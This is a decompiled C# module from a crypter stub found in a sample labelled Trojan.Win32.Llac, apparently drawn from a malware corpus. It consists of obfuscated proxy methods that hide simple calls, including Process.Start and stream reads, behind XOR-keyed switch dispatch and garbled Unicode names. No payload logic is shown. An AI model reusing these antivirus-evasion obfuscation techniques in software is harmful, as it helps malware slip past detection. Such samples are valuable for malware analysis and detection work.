// Decompiled with JetBrains decompiler
// Type: Ⴈ.Ⴈ
// Assembly: Sk1dZ™ Crypter Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 765DE0A6-3ADE-4E57-B9F8-38E417A60863
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Llac.corb-c03a55dcfef9171c3c7a521e3f6aa3cd6873dbf8e0e0c6041a02f9ac6f9bd531.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Sk1dZ__Crypter_Stub.My;
using System;
using System.Collections;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Windows.Forms;

namespace Ⴈ
{
  [StandardModule]
  [HideModuleName]
  internal sealed class Ⴈ
  {
    [HelpKeyword("My.Settings")]
    internal static MySettings Ⴓ => MySettings.Default;

    [SecuritySafeCritical]
    static Ⴈ() => Ⴈ.Ⴓ.ႣႼ();

    [SecuritySafeCritical]
    internal static bool Ⴍ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 50:
          num1 = 2;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 5;
            continue;
          case 1:
          case 6:
            num2 = 5;
            continue;
          case 2:
          case 3:
          case 7:
            goto label_8;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴈ.Ⴍ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return object.ReferenceEquals(obj0, obj1);
    }

    [SecuritySafeCritical]
    internal static void Ⴀ([In] Form obj0, [In] EventHandler obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 1:
          case 5:
            num1 = 4;
            continue;
          case 2:
            goto label_8;
          case 3:
            goto label_9;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 92:
                num2 = 0;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_9:
      return;
label_7:
      obj0.Load += obj1;
    }

    [SecuritySafeCritical]
    internal static void Ⴈ([In] ContainerControl obj0, [In] AutoScaleMode obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 2:
          case 3:
            goto label_7;
          case 4:
            goto label_8;
          case 5:
            num1 = 0;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 18:
                num2 = 1;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.AutoScaleMode = obj1;
    }

    [SecuritySafeCritical]
    internal static string Ⴄ([In] int obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 104:
          num1 = 1;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            num2 = 7;
            continue;
          case 1:
            goto label_8;
          case 3:
          case 4:
            num2 = 7;
            continue;
          case 6:
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴈ.Ⴄ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return Strings.Space(obj0);
    }

    [SecuritySafeCritical]
    internal static Process Ⴅ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 113:
          num1 = 0;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_8;
          case 2:
          case 5:
          case 7:
            goto label_3;
          case 4:
            num2 = 7;
            continue;
          case 6:
            num2 = 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴈ.Ⴅ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return Process.Start(obj0);
    }

    [SecuritySafeCritical]
    internal static int Ⴗ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 125:
          num1 = 2;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            num2 = 1;
            continue;
          case 1:
            goto label_3;
          case 2:
          case 5:
            goto label_8;
          case 4:
          case 6:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴈ.Ⴗ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return obj0.Length;
    }

    [SecuritySafeCritical]
    internal static bool Ⴐ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 67:
          num1 = 7;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            num2 = 1;
            continue;
          case 1:
          case 5:
            goto label_3;
          case 2:
            num2 = 1;
            continue;
          case 7:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴈ.Ⴐ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return obj0.Equals(obj1);
    }

    [SecuritySafeCritical]
    internal static bool Ⴃ([In] Assembly obj0, [In] Assembly obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 36:
          num1 = 6;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            num2 = 1;
            continue;
          case 1:
            goto label_3;
          case 3:
          case 4:
            num2 = 1;
            continue;
          case 6:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴈ.Ⴃ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return obj0 != obj1;
    }

    [SecuritySafeCritical]
    internal static string Ⴜ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 30:
          num1 = 0;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            goto label_8;
          case 2:
            num2 = 5;
            continue;
          case 3:
          case 4:
            num2 = 5;
            continue;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴈ.Ⴜ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return obj0.ToString() + obj1;
    }

    [SecuritySafeCritical]
    internal static int ႠႭ([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 66:
          num1 = 1;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            num2 = 6;
            continue;
          case 1:
          case 4:
          case 5:
            goto label_8;
          case 3:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴈ.ႠႭ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.ReadByte();
    }

    [SecuritySafeCritical]
    internal static bool ႠႠ([In] Hashtable obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 49:
          num1 = 6;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 1:
          case 3:
          case 6:
            goto label_8;
          case 4:
            num2 = 0;
            continue;
          case 5:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴈ.ႠႠ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.ContainsKey(obj1);
    }

    [SecuritySafeCritical]
    internal static void ႠႨ([In] WindowsFormsApplicationBase obj0, [In] string[] obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            num1 = 1;
            continue;
          case 2:
          case 3:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 109:
                num2 = 2;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Run(obj1);
    }
  }
}
